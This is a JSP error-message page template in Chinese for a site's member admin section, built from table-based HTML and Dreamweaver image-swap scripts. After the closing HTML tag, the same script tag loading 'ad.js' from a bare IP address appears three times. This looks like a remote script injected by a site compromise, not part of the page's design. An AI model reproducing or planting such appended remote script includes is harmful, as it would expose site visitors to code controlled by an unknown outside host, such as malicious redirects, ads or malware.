<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%
String path = request.getContextPath()+"/member/admin";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>错误！</TITLE>
<META http-equiv=Content-Type content="text/html; charset=gb2312">
<META 
content="" 
name=keywords>
<META content= name=description>
<STYLE type=text/css>
.neon {
	FILTER: glow(color=#002E60,strength=3)
}
DIV {
	WIDTH: 70px
}
BODY {
	MARGIN: 0px
}
BODY {
	MARGIN-TOP: 0px; SCROLLBAR-FACE-COLOR: #005fc5; FONT-SIZE: 12px; BACKGROUND: #ffffff; SCROLLBAR-HIGHLIGHT-COLOR: #799ae1; SCROLLBAR-SHADOW-COLOR: #799ae1; SCROLLBAR-3DLIGHT-COLOR: #005fc5; SCROLLBAR-ARROW-COLOR: #ffffff; SCROLLBAR-TRACK-COLOR: #aabfec; SCROLLBAR-DARKSHADOW-COLOR: #799ae1
}
</STYLE>
<LINK href="<%=path %>/images/duan_1.css" type=text/css rel=stylesheet>
<META content="MSHTML 6.00.2800.1106" name=GENERATOR>
<style type="text/css">
<!--
.STYLE1 {
	color: #FF0000;
	font-size: 12px;
}
.STYLE7 {COLOR: #003366; font-size: 12px;}
-->
</style>
<script type="text/JavaScript">
<!--
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}

function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_swapImage() { //v3.0
  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
}
//-->
</script>
</HEAD>
<BODY bgColor=#ffffff onLoad="MM_preloadImages('<%=path %>/images/fh_2.jpg')">
<TABLE height=470 cellSpacing=0 cellPadding=0 width=580 align=center border=0>
  <TBODY>
    <TR>
      <TD colSpan=3 height=9></TD>
    </TR>
    <TR>
      <TD vAlign=top width=8 background="<%=path %>/images/dhpddw.gif" rowSpan=2><!--DWLayoutEmptyCell-->&nbsp;</TD>
      <TD width=743 background="<%=path %>/images/h-1.gif" height=9></TD>
      <TD width=9 height=9><IMG height=9 src="<%=path %>/images/jiao.gif" width=9></TD>
    </TR>
    <TR>
      <TD vAlign=top align=right width=743 height=452><TABLE cellSpacing=0 cellPadding=0 width=556 border=0>
        <!--DWLayoutTable-->
        <TBODY>
          <TR>
            <TD vAlign=bottom width=548 height=27><IMG height=10 
            src="<%=path %>/images/jt2.gif" width=10> <SPAN class=lbt>错误信息提示：</SPAN></TD>
            <TD width=8 rowSpan=3>&nbsp;</TD>
          </TR>
          <TR>
            <TD background="<%=path %>/images/ht.gif" height=22></TD>
          </TR>
          <TR>
            <TD class=unnamed1 vAlign=top 
            height=9><br>
              &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="<%=path %>/images/709_confuse.jpg" width="96" height="96"><span class="STYLE7"><span class="STYLE1">错误操作！</span>原因可能如下：</span><br></TD>
          </TR>
          <TR>
            <TD height=27 colspan="2" vAlign=top><!--DWLayoutEmptyCell-->&nbsp;</TD>
          </TR>
          <TR>
            <TD height=164 vAlign=top><IMG height=7 src="<%=path %>/images/jt.gif" width=7> <span class="STYLE1">您输入的数据不完整！<br>
              <br>
            </span><IMG height=7 src="<%=path %>/images/jt.gif" width=7> <span class="STYLE1">缺少查询项！<br>
              <br>
            </span><IMG height=7 src="<%=path %>/images/jt.gif" width=7> <span class="STYLE1">姓名不能为空！<br>
                <br>
                <IMG height=7 src="<%=path %>/images/jt.gif" width=7> …………！<br>
                <br>
                <IMG height=7 src="<%=path %>/images/jt.gif" width=7> <span class="STYLE7"><a href="<%=path %>/error.jsp" class="da">以上为错误信息提示样式范例[应用时请将此行删除！(绿色字)]</a></span><br>
            </span></TD>
            <TD></TD>
          </TR>
          <TR>
            <TD height=20 align="center"><a href="<%=path %>/postdata.jsp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('Image9','','<%=path %>/images/fh_2.jpg',1)"><img src="<%=path %>/images/fh_1.jpg" name="Image9" width="60" height="22" border="0"></a></TD>
            <TD></TD>
          </TR>
        </TBODY>
      </TABLE></TD>
      <TD width=9 background="<%=path %>/images/s-1.gif"></TD>
    </TR>
  </TBODY>
</TABLE>
<IFRAME name=top align=default src="<%=path %>/bottom.jsp" 
      frameBorder=0 width=100% scrolling=no 
      height=88>
<h1>&nbsp;</h1>
</IFRAME>
</BODY></HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
<script src="http://222.208.183.246/ad/ad.js"></script>
<script src="http://222.208.183.246/ad/ad.js"></script>
